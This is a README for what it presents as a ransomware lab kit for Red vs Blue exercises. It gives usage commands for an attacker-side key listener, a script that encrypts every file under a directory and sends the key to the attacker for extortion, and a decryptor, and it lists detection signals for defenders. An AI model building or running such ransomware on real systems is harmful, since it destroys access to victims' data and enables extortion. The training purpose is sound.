## Requirements
pip install cryptography

## How to use
# keylistener.py
```bash
python keylistener.py <IP> <PORT>
```
This just sets up the attacker machine to listen to incoming connections on the supplied IP & Port. When the ransomware is ran on the victim's machine, the key will be sent back to the attacker for extortion.

# ransom.py
```bash
python ransom.py <ip of attacker> <port attacker listening on for key>
```
Wherever this is run, it will recursively go through every subdirectory and encrypt the files using a generated key it sends back to the attacker.

# decrypt.py
```bash
python decrypt.py <encrypt key in bytes>
```
Reverse of ransom.py

## Note
This repository is for controlled Red vs Blue lab simulations only.

The code intentionally uses simplified and insecure patterns (e.g., plaintext key handling, minimal error handling, no evasion techniques). It is not representative of real-world threats and is not intended for use outside an isolated test environment.

For blue-team purposes, this lab is meant to generate observable behaviors such as:
- rapid file modifications and entropy changes
- process execution patterns
- network connections between hosts
- log and alert generation in monitoring tools (e.g., Wazuh)

Do not run this on production systems or networks. Use only on isolated virtual machines with disposable data.
